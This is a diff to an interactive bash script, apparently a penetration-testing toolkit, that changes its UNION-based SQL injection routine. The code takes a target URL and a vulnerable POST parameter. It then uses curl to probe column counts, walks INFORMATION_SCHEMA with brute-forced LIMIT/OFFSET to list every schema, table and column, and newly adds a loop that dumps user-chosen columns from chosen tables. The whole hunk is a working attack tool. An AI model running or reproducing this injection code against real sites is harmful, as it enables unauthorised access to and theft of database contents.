@@ -11245,11 +11245,12 @@ while true; do
 		read -p "(example, http://www.terget.com): " TIP
 		if [[ "$TIP" != "" ]];
 		then
-			echo "Digit the POST parameters with the special char"
-			read -p "(example with a single quote, email=hello@gmail.com'): " PAR
+			echo "Digit the POST parameters with the special char (please, single quote has got to have backslash to escape in input)"
+			read -p "(example with a single quote, email=hello@gmail.com\'): " PAR
 			if [[ "$PAR" != "" ]];
 			then
-				curl -s -k -X POST -d "$PAR"" UNION SELECT version() -- -" "$TIP"
+				echo "$PAR"" UNION SELECT version() -- -"
+				curl -v -k -X POST -d "$PAR"" UNION SELECT version() -- -" "$TIP"
 				for I in {1..9}
 				do
 					if [[ "$Q" == "" ]];
@@ -11258,7 +11259,8 @@ while true; do
 					else
 						Q="$Q""$I"","
 					fi
-					curl -s -k -X POST -d "$PAR"" UNION SELECT ""$Q""version() -- -" "$TIP"
+					echo "$PAR"" UNION SELECT ""$Q""version() -- -"
+					curl -v -k -X POST -d "$PAR"" UNION SELECT ""$Q""version() -- -" "$TIP"
 				done
 				echo "Digit the position of version, if was the first occurence, digit 1, otherwise digit the position number ignoring other numbers"
 				echo "'1,2,8.0.15', the position will be 3 (ignoring the other numbers)"
@@ -11266,30 +11268,65 @@ while true; do
 				if [[ "$POS" != "" ]];
 				then
 					PES=""
-					if [[ $POS > 1 ]];
+					LMT="100"
+					FST="100"
+					echo "Digit the maximum number to try in LIMIT"
+					read -p "(example, 50, default is 100): " TLMT
+					if [[ "$TLMT" != "" ]];
+					then
+						LMT="$TLMT"
+					fi
+					echo "Digit the maximum number to try in OFFSET"
+					read -p "(example, 50, default is 100): " TFST
+					if [[ "$TFST" != "" ]];
+					then
+						FST="$TFST"
+					fi
+					if [[ $POS -gt 1 ]];
 					then
 						POS=$(($POS - 1))
-						for O in {1..$POS}
+						for O in $(seq 1 $POS)
 						do
 							PES="$PES"",""$O"
 						done
 						PES="$PES"","
-						for A in {0..100}
+						for A in $(seq 0 $LMT)
 						do
-							for B in {0..100}
+							for B in $(seq 0 $FST)
 							do
-								curl -s -k -X POST -d "$PAR"" UNION SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
+								echo "$PAR"" UNION SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -"
+								curl -v -k -X POST -d "$PAR"" UNION SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
+								##echo "$PAR"" UNION SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -"
+								##curl -v -k -X POST -d "$PAR"" UNINON SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
 							done
 						done
 					else
-						for A in {0..100}
+						for A in $(seq 0 $LMT)
 						do
-							for B in {0..100}
+							for B in $(seq 0 $FST)
 							do
-								curl -s -k -X POST -d "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
+								echo "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -"
+								curl -v -k -X POST -d "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
+								##echo "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS LIMIT ""$A"" OFFSET ""$B"" -- -"
+								##curl -v -k -X POST -d "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
 							done
 						done
 					fi
+					TBLN="0"
+					while [[ "$TBLN" != "quit" ]];
+					do
+						echo "Digit the TABLE_NAME, the secondo record (TABLE_SCHEMA:TABLE_NAME:COLUMN_NAME)"
+						read -p "(example, Employes, quit for exit): " TBLN
+						if [[ "$TBLN" != "" ]];
+						then
+							echo "Digit the COLUMN_NAME, the secondo record (TABLE_SCHEMA:TABLE_NAME:COLUMN_NAME)"
+							read -p "(example, Person, quit for exit): " CLMN
+							if [[ "$CLMN" != "" ]];
+							then
+								curl -v -k -X POST -d "$PAR"" UNION SELECT CONCAT(""$CLMN"") FROM ""$TBLN"" -- -" "$TIP"
+							fi
+						fi
+					done
 					PES=""
 					POS=""
 				fi
